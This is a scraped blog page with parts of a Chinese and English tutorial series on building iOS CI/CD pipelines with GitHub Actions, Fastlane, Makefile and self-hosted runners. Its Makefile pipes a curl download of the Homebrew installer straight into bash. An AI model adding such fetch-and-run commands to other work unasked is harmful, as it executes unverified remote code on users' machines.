完成時自動觸發執行 workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # 完成＋執行成功才執行部署 if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-firebaseCD-Deploy-Testflight.yml:name: Deploy Testflighton: # 當 Build Action 完成時自動觸發執行 workflow_run: workflows: [\"Build\"] types: - completedjobs: deploy: runs-on: ubuntu-latest # 完成＋執行成功才執行部署 if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-testflight另外也可以用 Reusing Workflow :CD-Deploy-Firebase.yml:name: Deploy Firebaseon: # 任意的觸發條件，這裡以手動表單觸發為例 workflow_dispatch: inputs: RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: stringjobs: build: needs: Build uses: ./.github/workflows/CD-Build.yml secrets: inherit with: RELEASE_NOTE: ${{ inputs.RELEASE_NOTE }} deploy: runs-on: ubuntu-latest # Job 預設是並發執行，用 needs 限制需等待 build 完成才執行 needs: [build] # 執行成功，才部署 if: ${{ always() &amp;&amp; needs.deploy.result == 'success' }} steps: - name: Checkout Code uses: actions/checkout@v4 - name: Install Dependencies run: | make steup - name: Download Build Artifact uses: actions/download-artifact@v4 with: name: build-artifact path: ./fastlane/build/ - name: Deploy to Production run: | bundle exec fastlane deploy-firebaseGitHub Actions — Artifact同 Cache，目前 就算是 Self-hosted Runner Artifcact 功能依然會走 GitHub Cloud 受到使用量限制 ( 免費帳號 500MB 起 )。 Self-hosted Runner 要達到類似的效果可以自行建立共享主機目錄或找其他工具替代。因此目前 Artifact 實際我只用來存放小資料，例如 Snapshot Tests 的錯誤結果、測試報告…等等CI— Nightly Build 執行快照+單元測試+打包+CD 部署到 Firebase App Distribution流程每天凌晨 3 點自動針對 main(develop or master) 分支跑全部測試(unit+snapshot tests)，如果失敗則傳送失敗通知到 Slack 工作群組；如果成功則打包+部署一個版本到 Firebase App Disturbution，打包成功/失敗都會傳送 Slack 通知。CI-Nightly-Build-And-Deploy.ymlRepo → Actions → New workflow → set up a workflow yourself。# Workflow(Action) 名稱name: CI-Nightly Build And Deploy# Actions Log 的標題名稱run-name: \"[CI-Nightly Build And Deploy] ${{ github.ref }}\"# 觸發事件on: # 排程定時自動執行 # https://crontab.guru/ # UTC 時間 schedule: # UTC 的 19:00 = 每天 UTC+8 的 03:00 - cron: '0 19 * * *' # 手動觸發 workflow_dispatch:# Job 工作項目# Job 會並發執行jobs: # 測試工作 testing: # Reuse Workflow (workflow_call) uses: ./.github/workflows/CI-Testing.yml # 傳遞所有 Secrets 給 CD-Testing.yml secrets: inherit with: # 執行全部測試 TEST_LANE: \"run_all_tests\" # 目標分支：main, develop or master...etc BRANCH: \"main\" deploy-env: runs-on: ubuntu-latest outputs: DATE_STRING: ${{ steps.get_date.outputs.DATE_STRING }} steps: - name: Get Date String id: get_date run: | VERSION_DATE=$(date -u '+%Y%m%d') echo \"${VERSION_DATE}\" echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_ENV echo \"DATE_STRING=${VERSION_DATE}\" &gt;&gt; $GITHUB_OUTPUT deploy: # Job 預設是並發執行，用 needs 限制需等待 testing 和 deploy-env 完成才執行 needs: [testing, deploy-env] # 如果測試成功才執行 if: ${{ needs.testing.result == 'success' }} # Reuse Workflow (workflow_call) uses: ./.github/workflows/CD-Deploy.yml # 傳遞所有 Secrets 給 CD-Deploy.yml secrets: inherit with: VERSION_NUMBER: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} RELEASE_NOTE: NightlyBuild-${{ needs.deploy-env.outputs.DATE_STRING }} # 目標分支：main, develop or master...etc BRANCH: \"main\"# ----- Slack Notify ----- testing-failed-slack-notify: needs: [testing] runs-on: ubuntu-latest if: ${{ needs.testing.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build - Testing 失敗\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\" deploy-failed-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'failure' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":x: Nightly Build Deploy 失敗\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\" deploy-success-slack-notify: needs: [deploy] runs-on: ubuntu-latest if: ${{ needs.deploy.result == 'success' }} steps: - name: Post text to a Slack channel uses: slackapi/slack-github-action@v2.1.0 with: method: chat.postMessage token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ vars.SLACK_TEAM_CHANNEL_ID }} text: \":white_check_mark: Nightly Build Deploy 成功\\nWorkflow: &lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|View Run&gt;\"Commit 檔案到 Repo 主分支，手動觸發測試、打包功能看看結果： 日後會每日自動觸發。Demo等待測試任務、打包部署任務、通知任務都完成後，查看結果。我們就能直接在手機上安裝 Nightly Build 版本來進行搶先體驗測試。技術細節這個 Action 我們直接復用前面設計的 CI-Testing 和 CD-Deploy，組合成我們的 Nightly Build，非常彈性好用！完整程式碼： CI-Nightly-Build-And-Deploy.ymlSelf-hosted Runner 注意事項本文是 Public Repo 因此直接使用 GitHub Hosted 的 macOS Runner，但在實際工作上我們的 Repo 一定是 Private，直接使用 GitHub Hosted Runner 超貴不划算(約一個月就能買一台 Mac Mini 放在公司吃到飽爽爽跑)，每一台依照效能可以起多個 Runner 同時並發接任務來做。 細節可參考 上一篇 「 Self-hosted Runner 建置與改用 」部分 ，在本地電腦安裝好 XCode 跟基本環境後註冊、啟用 Runner、Action Worflow YAML 中把 runs-on 改成 [self-hosted] 即可。多個 Runner 在同一台電腦的問題，我們多半已在上面的 Actions 裡解決了，例如把所有依賴的共用目錄都改成本地目錄，還有一個測試會遇到的問題要解決，就是搶模擬器問題：「 當兩個測試 Job 被兩個 Runner 在同一台機器上同時檢來做，如果指定同個模擬器就會互相干擾導致測試失敗。」解決方法也很容易，就是為個別 Runner 都設定一台模擬器。多個 Runner 在同台機器的模擬器設定假設我 同一台電腦上有兩個 Runner 在並行接收任務： ZhgChgLideMacBook-Pro-Runner-A ZhgChgLideMacBook-Pro-Runner-B在 XCode 模擬器設定我們就需要新增兩個模擬器： 型號、iOS 版本同測試環境CI-Testing.yml 中測試步驟改成：# 執行 Fastlane Unit 測試 Lane - name: Run Tests id: testing # 指定工作目錄，這樣後續指令就不用在特別 cd ./Product/ working-directory: ./Product/ env: # ... # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # 模擬器的 iOS 版本 SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # 當前 Runner 名稱 RUNNER_NAME: ${{ runner.name }} # ... run: | # ... bundle exec fastlane ${TEST_LANE} device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" | tee \"$RUNNER_TEMP/testing_output.txt\" # ... device 改成 ${RUNNER_NAME} (${SIMULATOR_IOS_VERSION}) SIMULATOR_IOS_VERSION 還是統一看 Repo variables 變數組合結果就會是(以 18.4 為例)： Runner: ZhgChgLideMacBook-Pro-Runner-A 模擬器: ZhgChgLideMacBook-Pro-Runner-A(18.4) Runner: ZhgChgLideMacBook-Pro-Runner-B 模擬器: ZhgChgLideMacBook-Pro-Runner-B(18.4)這樣兩個 Runner 同時在執行測試時就會起兩個模擬器自己跑自己的了。完整專案 Repo補充 SSH Agent 設定 — For Fastlane Match or Private CocoaPods Repo在使用 Fastlane Match 或 Private CocoaPods Repo，因為是在另一個 Private Repo 當中，當前 Repo/Action 環境無法直接 git clone，需要使用 ssh agent 設定好環境，在 Action 執行時才有權限操作。Step 1. 產生 SSH Keyssh-keygen -t ed25519 -C \"zhgchgli@gmail.com\"Enter file in which to save the key (/Users/zhgchgli/.ssh/id_ed25519): /Users/zhgchgli/Downloads/zhgchgli 輸入到下載路徑方便我們拷貝內容Enter passphrase for “/Users/zhgchgli/Downloads/zhgchgli” (empty for no passphrase): 留空： CI/CD 使用，無法在 CLI 交互下輸入 Passphrase， 因此請留空 產生完畢 ( .pub/private_key)Step 2. 到 Private Repo 設定 Deploy Keygithub-actions-ci-cd-demo-certificates RepoSettings → Security → Deploy keys → Add deploy key。 Title: 輸入 Key 名稱 Key: 貼上 .pub Key 內容完成。Step 3. 回 Action 的 Repo 設定 SSH Private Key to Secretsgithub-actions-ci-cd-demo RepoSettings → Secrets and variables → Actions → New repository secret。 Name: 輸入密鑰變數名稱 SSH_PRIVATE_KEY Secret: 貼上 private_key 內容完成。Step 4. SSH Agent 設定完成，來驗證一下 Git Clone Private Repo 的權限Demo-Git-Clone-Private-Repo.yml :name: Demo Git Clone Private Repoon: workflow_dispatch:jobs: clone-private-repo: name: Git Clone Private Repo runs-on: ubuntu-latest timeout-minutes: 30 steps: # 🔐 啟用 SSH Agent 並加入私鑰 - name: Setup SSH Agent uses: webfactory/ssh-agent@v0.9.0 with: ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }} # 🛡️ 將 github.com 加入 known_hosts 以避免 host verification 錯誤 - name: Add GitHub to known_hosts run: | mkdir -p ~/.ssh ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts # 📦 使用 SSH clone private repo 並驗證 - name: Clone and Verify Private Repo run: | git clone git@github.com:ZhgChgLi/github-actions-ci-cd-demo-certificates.git ./fakeMatch/ if [ -d \"./fakeMatch/.git\" ]; then echo \"✅ Repo cloned successfully into ./fakeMatch/\" cd ./fakeMatch echo \"📌 Current commit: $(git rev-parse --short HEAD)\" else echo \"❌ Clone failed. SSH Agent may not be configured properly.\" exit 1 fi可以用以上 Action 驗證一下是否設定成功。成功，後續 fastlane match or pod install private pods 應該就能正確執行。總結這篇文章詳細紀錄了使用 GitHub Actions 開發完整的 iOS CI/CD 流程，下一篇將優化使用者端(工程師/PM/設計師)體驗， 完善 Slack 通知及使用 Google Apps Script Web App 串接 GitHub Actions 打造免費易用的跨團隊打包平台工具。系列文章： CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ CI/CD 實戰指南（二）：GitHub Actions 與 self-hosted Runner 使用與建置大全 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台Buy me a coffee 本系列文章花費了大量的時間精力撰寫，如果內容對您有幫助、對您的團隊有實質提升工作效率與產品品質；歡迎請我喝杯咖啡，感謝支持！Buy me a coffee有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 60 Total Views Last Statistics Date: 2025-08-15 | 56 Views on Medium." }, { "title": "CI/CD Practical Guide (3): Implementing iOS App CI and CD Workflows Using GitHub Actions", "url": "/posts/zrealm-dev/en/ci-cd-practical-guide-3-implementing-ios-app-ci-and-cd-workflows-using-github-actions-4b001d2e8440/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, firebase, cicd-pipeline", "date": "2025-07-07 23:02:24 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (3): Implementing iOS App CI and CD Workflows Using GitHub Act...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (3): Implementing iOS App CI and CD Workflows Using GitHub ActionsA complete tutorial on automating the build, test, and deployment of iOS Apps using GitHub ActionsPhoto by RobsIntroductionIn the previous article “CI/CD Practical Guide (2): Comprehensive Guide to Using GitHub Actions and Self-hosted Runners”, we introduced the basics of GitHub Actions, its workflow, and how to use your own machine as a Runner. We implemented three simple automation Actions together. This article will focus on the practical use of GitHub Actions to build an iOS App CI/CD workflow, guiding you step by step while supplementing your knowledge of GitHub Actions.App CI/CD Workflow DiagramThis article will focus on the CI/CD section built with GitHub Actions. The next article “CI/CD Practical Guide (4): Using Google Apps Script Web App to Connect GitHub Actions for a Free and Easy Packaging Tool Platform” will introduce the right half of the diagram, which involves using Google Apps Script Web App to build a cross-team collaboration packaging platform.Workflow Process: GitHub Actions triggers via Pull Request, form submission, or scheduled event Executes corresponding Workflow Jobs/Steps Steps execute corresponding Fastlane (iOS) or (Android Gradle) scripts Fastlane executes corresponding xcodebuild (iOS) commands Obtains execution results Subsequent Workflow Jobs/Steps process results CompletionGitHub Actions ResultsLet’s start with the final results to give you some motivation for implementation!CI TestingCI Nightly Build, CD DeployBasic Knowledge of GitHub Actions x Self-hosted RunnerIf you are not familiar with GitHub Actions and setting up a Self-hosted Runner, I strongly recommend reading the previous article “CI/CD Practical Guide (2): Comprehensive Guide to Using GitHub Actions and Self-hosted Runners” or implementing it alongside the knowledge from the previous article. Let’s get started with the implementation!Infrastructure Architecture of the iOS Demo ProjectThe iOS project content used in this article includes test items generated by AI, so there is no need to focus on the iOS programming details; we will only discuss the Infra &amp; CI/CD aspects. The following tools are based on past experience; if it’s a new project, consider using the updated mise and tuist.MintThe Mint tool helps us manage the versions of dependency tools uniformly (Gemfile can only manage Ruby Gems), such as XCodeGen, SwiftFormat, SwiftLint, Periphery, etc.Mintfile:yonaskolb/Mint@0.17.5yonaskolb/XcodeGen@2.35.0nicklockwood/SwiftFormat@0.51.13Here we only use three. If you find it too complicated, you can skip it and directly install the required tools using brew install in the Action Workflow Step.BundleGemfile:source 'https://rubygems.org'gem 'cocoapods', '~&gt;1.16.0'gem 'fastlane', '~&gt;2.228.0'plugins_path = File.join(File.dirname(__FILE__), 'Product', 'fastlane', 'Pluginfile')eval_gemfile(plugins_path) if File.exist?(plugins_path)This manages Ruby (Gems) related dependencies. The two most commonly used in iOS projects are cocoapods and fastlane.CocoapodsProduct/podfile:platform :ios, '13.0'use_frameworks!target 'app-ci-cd-github-actions-demo' do pod 'SnapKit'end Although it has been declared to be deprecated, Cocoapods is still very common in older iOS projects. Here we simply add SnapKit as a demo.XCodeGenTo avoid conflicts caused by changes to .xcodeproj / .xcworkspace during multi-person development, we use a Project.yaml to define the XCode Project content and generate the project files locally (not pushed to Git).Product/project.yaml:name: app-ci-cd-github-actions-demooptions: bundleIdPrefix: com.example deploymentTarget: iOS: '13.0' usesTabs: false indentWidth: 2 tabWidth: 2configs: Debug: debug Release: releasetargets: app-ci-cd-github-actions-demo: type: application platform: iOS sources: - app-ci-cd-github-actions-demo resources: - app-ci-cd-github-actions-demo/Assets.xcassets - app-ci-cd-github-actions-demo/Base.lproj info: path: app-ci-cd-github-actions-demo/Info.plist properties: CFBundleIdentifier: $(PRODUCT_BUNDLE_IDENTIFIER) settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo cocoapods: true app-ci-cd-github-actions-demoTests: type: bundle.unit-test platform: iOS sources: - app-ci-cd-github-actions-demoTests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.tests app-ci-cd-github-actions-demoUITests: type: bundle.ui-testing platform: iOS sources: - app-ci-cd-github-actions-demoUITests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoUITests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.uitests app-ci-cd-github-actions-demoSnapshotTests: type: bundle.unit-test platform: iOS sources: - path: app-ci-cd-github-actions-demoSnapshotTests excludes: - \"**/__Snapshots__/**\" dependencies: - target: app-ci-cd-github-actions-demo - product: SnapshotTesting package: SnapshotTesting info: path: app-ci-cd-github-actions-demoSnapshotTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.snapshottestspackages: SnapshotTesting: url: https://github.com/pointfreeco/swift-snapshot-testing from: 1.18.4SnapshotTesting: Managed using Swift Package Manager.FastlaneEncapsulates the xcodebuild command, as well as the complex steps for connecting to App Store Connect API, Firebase API, and other services.Product/fastlane/Fastfile:default_platform(:ios)platform :ios do desc \"Run all tests (Unit Tests + UI Tests)\" lane :run_all_tests do |options| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Run only Unit Tests\" lane :run_unit_tests do |options| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, only_testing: [ \"app-ci-cd-github-actions-demoTests\" ], output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Build and upload to Firebase App Distribution\" lane :beta do |options| if options[:version_number] &amp;&amp; options[:version_number].to_s.strip != \"\" increment_version_number(version_number: options[:version_number]) end if options[:build_number] &amp;&amp; options[:build_number].to_s.strip != \"\" increment_build_number(build_number: options[:build_number]) end update_code_signing_settings( use_automatic_signing: false, path: \"app-ci-cd-github-actions-demo.xcodeproj\", team_id: ENV['TEAM_ID'], code_sign_identity: \"iPhone Developer\", sdk: \"iphoneos*\", profile_name: \"cicd\" ) gym( scheme: \"app-ci-cd-github-actions-demo\", clean: true, export_method: \"development\", output_directory: \"fastlane/build\", output_name: \"app-ci-cd-github-actions-demo.ipa\", export_options: { provisioningProfiles: { \"com.test.appcicdgithubactionsdemo\" =&gt; \"cicd\", }, } ) firebase_app_distribution( app: \"1:127683058219:ios:98896929fa131c7a80686e\", firebase_cli_token: ENV[\"FIREBASE_CLI_TOKEN\"], release_notes: options[:release_notes] || \"New beta build\" ) endendNote: The provisioningProfiles and profile_name correspond to the Profiles certificate names in App Developer. (If using match, these specifications are not necessary.)Fastlane is an indispensable part of iOS CI/CD, allowing you to quickly develop the actual execution steps of CI/CD using its encapsulated methods; we only need to focus on the overall script design without dealing with complex API connections or command writing.For example: Fastlane only requires writing “scan(xxx)” to execute tests, whereas writing it as xcodebuild would require “ xcodebuild -workspace ./xxx.xcworkspace -scheme xxx -derivedDataPath xxx ‘platform=iOS Simulator,id=xxx’ clean build test”, and packaging and deployment would be much more troublesome, requiring manual connections to App Store Connect/Firebase API, with key verification needing over 10 lines of code.In the demo project, we only have three lanes: run_all_tests: Run all types of tests (Snapshot + Unit) run_unit_tests: Run only unit tests (Unit) beta: Package and deploy to Firebase App DistributionFastlane — MatchDue to limitations in the demo project, Match is not used to manage team development and deployment certificates here, but it is still worth mentioning. It is recommended to use Match to manage all development and deployment certificates for the team, making it easier to control and update uniformly. Using Match allows you to directly use commands like match all during project setup to install all the necessary certificates for development in one go. Fastlane Match will use another Private Repo to manage certificate keys, and in GitHub Actions, you need to set up the SSH Agent to clone another Private Repo. (Please refer to the supplementary section at the end.)— — —MakefileMakefileThis allows both the development side and CI/CD to use the Makefile to execute commands, making it easier to encapsulate the same environment, paths, and operations. A classic case is that some people use the locally installed pod install, while others use the Bundler-managed bundle exec pod install. If the versions differ, it may lead to discrepancies. If you find it too complicated, you can skip it and directly write the commands to be executed in the Action Workflow Step.Makefile:#!makePRODUCT_FOLDER = ./Product/SHELL := /bin/zsh.DEFAULT_GOAL := installMINT_DIRECTORY := ./mint/export MINT_PATH=$(MINT_DIRECTORY)## 👇 Help function.PHONY: helphelp: @echo \"\" @echo \"📖 Available commands:\" @grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \\ awk 'BEGIN {FS = \":.*?## \"}; {printf \" \\033[36m%-20s\\033[0m %s\\n\", $$1, $$2}' @echo \"\"## Setup.PHONY: setupsetup: check-mint ## Install Ruby and Mint dependencies @echo \"🔨 Installing Ruby dependencies...\" bundle config set path 'vendor/bundle' bundle install @echo \"🔨 Installing Mint dependencies...\" mint bootstrap## Install.PHONY: installinstall: XcodeGen PodInstall ## Execute XcodeGen and CocoaPods installation.PHONY: XcodeGenXcodeGen: check-mint ## Generate .xcodeproj using XcodeGen @echo \"🔨 Execute XcodeGen\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ mint run yonaskolb/XcodeGen --quiet.PHONY: PodInstallPodInstall: ## Install CocoaPods dependencies @echo \"📦 Installing CocoaPods dependencies...\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ bundle exec pod install### Mintcheck-mint: check-brew ## Check if Mint is installed; if not, install it automatically @if ! command -v mint &amp;&gt; /dev/null; then \\ echo \"🔨 Installing mint...\"; \\ brew install mint; \\ fi### Brewcheck-brew: ## Check if Homebrew is installed; if not, install it automatically @if ! command -v brew &amp;&gt; /dev/null; then \\ echo \"🔨 Installing Homebrew...\"; \\ /bin/bash -c \"$$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"; \\ fi## Format only git swift files.PHONY: formatformat: check-mint ## Format all Swift files under Product/ mint run swiftformat $(PRODUCT_FOLDER)To avoid polluting the entire system or other projects, we try to specify the paths of dependency packages (e.g., mint, bundle, etc.) within the project directory (and use .gitignore to exclude them).├── mint (Mint dependencies)│ └── packages├── Product│ ├── app-ci-cd-github-actions-demo│ ├── app-ci-cd-github-actions-demo.xcodeproj│ ├── app-ci-cd-github-actions-demo.xcworkspace│ ├── app-ci-cd-github-actions-demoSnapshotTests│ ├── app-ci-cd-github-actions-demoTests│ ├── app-ci-cd-github-actions-demoUITests│ ├── fastlane│ └── Pods (Cocoapods dependencies)└── vendor (Bundle dependencies) └── bundlemake helpUsing Makefile for unified project setup steps: git clone repo cd ./repo make setup Install necessary tool dependencies ( brew, mint, bundle, xcodegen, swiftformat,…) make install Generate the project (execute pod install, xcodegen) Done Open and run the project Whether for CI/CD or onboarding new team members, follow the above steps to set up the project.GitHub Actions CI/CD Case Studies in This ArticleThis article will introduce three GitHub Actions CI/CD workflow case studies. You can refer to the steps to build a CI/CD that fits your team’s workflow. CI — Execute unit tests upon Pull Request CD — Package + deploy to Firebase App Distribution CI + CD — Nightly Build executing snapshot + unit tests + packaging + deploying to Firebase App Distribution Due to demo limitations, this article will only connect to package and deploy to Firebase App Distribution. The steps for packaging to TestFlight or the App Store are the same, with the only difference being the scripts in Fastlane; feel free to explore.CI — Execute Unit Tests Upon Pull RequestProcessThe Develop branch cannot be pushed directly; a Pull Request must be made to update it. All Pull Requests must pass Review and unit tests before they can be merged, and any new Commit Push will trigger retesting.CI-Testing.ymlRepo → Actions → New workflow → set up a workflow yourself.# Workflow (Action) namename: CI-Testing# Title name in Actions Logrun-name: \"[CI-Testing] ${{ github.event.pull_request.title || github.ref }}\"# If there are new Jobs in the same Concurrency Group, the running ones will be canceled# For example, if a task triggered by a Push Commit has not executed yet and another Push Commit occurs, the previous task will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.event.pull_request.number || github.ref }} cancel-in-progress: true# Trigger Eventson: # PR Events pull_request: # PR - When opened, reopened, or when a new Push Commit occurs types: [opened, synchronize, reopened] # Manual form trigger workflow_dispatch: # Form Inputs fields inputs: # Test Fastlane Lane to execute TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' type: choice options: - run_unit_tests - run_all_tests # Other Workflows can trigger this Workflow # Nightly Build will call this workflow_call: # Form Inputs fields inputs: # Test Fastlane Lane to execute TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' # workflow_call inputs do not support choice type: string BRANCH: description: 'Branch' type: string # Job Items# Jobs will run concurrentlyjobs: # Job ID testing: # Job name (optional, but it's better for readability in logs) name: Testing # Runner Label - Use GitHub Hosted Runner macos-15 to execute the job # Note: Since this project is a Public Repo, it can be used for free indefinitely # Note: Since this project is a Public Repo, it can be used for free indefinitely # Note: Since this project is a Public Repo, it can be used for free indefinitely # If it's a Private Repo, charges apply based on usage, and macOS machines are the most expensive (10 times), which could reach the 2,000 minutes free limit after running 10 times # It is recommended to use a self-hosted Runner runs-on: macos-15 # Set the maximum timeout duration to prevent endless waiting in case of anomalies timeout-minutes: 30 # use zsh # Optional, I just prefer using zsh; the default is bash defaults: run: shell: zsh {0} # Job Steps # Steps will be executed in order steps: # git clone the current project &amp; checkout to the executing branch - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage, not needed for our testing environment # default: false lfs: false # If specified, checkout the specified branch; otherwise, use the default (current branch) # Since the on: schedule event can only run on the main branch, if we want to do Nightly Build or similar tasks, we need to specify the branch # e.g. on: schedule -&gt; main branch, Nightly Build master branch ref: ${{ github.event.inputs.BRANCH || '' }} # ========== Env Setup Steps ========== # Read the specified XCode version for the project # In the following steps, we manually specify the XCode_x.x.x.app to use # instead of using xcversion, as xcversion has been sunset and is unstable. - name: Read .xcode-version id: read_xcode_version run: | XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # You can also specify the global XCode version here, so you don't need to specify DEVELOPER_DIR in subsequent steps # However, this command requires sudoer privileges, so if it's a self-hosted runner, ensure the runner environment has sudo privileges # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # Read the specified Ruby version for the project - name: Read .ruby-version id: read_ruby_version run: | RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # Install or set the Runner Ruby version to the specified version - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # Optional, because previously when running multiple runners on self-hosted CI/CD, cocoapods repos are in a shared directory # The problem solved is: there is a very small chance of conflicts when pulling cocoapods repos during simultaneous pod installs (since the default is $HOME/.cocoapods/) # GitHub Hosted Runner does not require this setting # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: | # # Each Runner uses its own .cocoapods folder to prevent resource conflicts # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # Note that even for self-hosted, Cache is currently Cloud Cache and will count towards usage # Rules: Automatically deleted after 7 days of no hits, single Cache limit is 10 GB, Cache only on successful Action # Public Repo: Free and unlimited # Private Repo: Starting from 5 GB # Self-hosted can write Cache &amp; Restore strategies using shell scripts or use other tools for assistance # Bundle Cache (Gemfile) # Corresponds to the installation path specified in the Makefile, ./vendor - name: Cache Bundle uses: actions/cache@v3 with: path: | ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: | ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # Default is in the project/Pods directory - name: Cache CocoaPods uses: actions/cache@v3 with: path: | ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: | ${{ runner.os }}-cocoapods- # Mint cache # Corresponds to the installation path specified in the Makefile, ./mint - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: | ${{ runner.os }}-mint- # ==================== # Project Setup &amp; Dependency Installation - name: Setup &amp; Install Dependency run: | # Execute the Setup command encapsulated in the Makefile, corresponding to commands like: # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... # Other setup commands make setup # Execute the Install command encapsulated in the Makefile, corresponding to commands like: # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... # Other install commands make install # Execute Fastlane Unit Test Lane - name: Run Tests id: testing # Specify the working directory, so subsequent commands don't need to cd ./Product/ working-directory: ./Product/ env: # Test plan, run all or just unit tests # If triggered by a PR, use run_unit_tests; otherwise, check the value of inputs.TEST_LANE, default is run_all_tests TEST_LANE: ${{ github.event_name == 'pull_request' &amp;&amp; 'run_unit_tests' || github.event.inputs.TEST_LANE || 'run_all_tests' }} # Specify the XCode_x.x.x version to use for this Job DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # Name of the simulator being used SIMULATOR_NAME: ${{ vars.SIMULATOR_NAME }} # iOS version of the simulator SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # Current Runner name RUNNER_NAME: ${{ runner.name }} # Increase XCodebuild command timeout duration and retry count # Because when the machine is under heavy load, it may fail after 3 attempts FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 60 FASTLANE_XCODEBUILD_SETTINGS_RETRIES: 10 run: | # If self-hosted and running multiple Runners on the same machine, there may be issues with simulator contention (discussed later) # To avoid this problem, it is recommended to name the simulator after the Runner name, so each Runner has its own simulator, preventing conflicts that could lead to test failures # e.g. bundle exec fastlane run_unit_tests 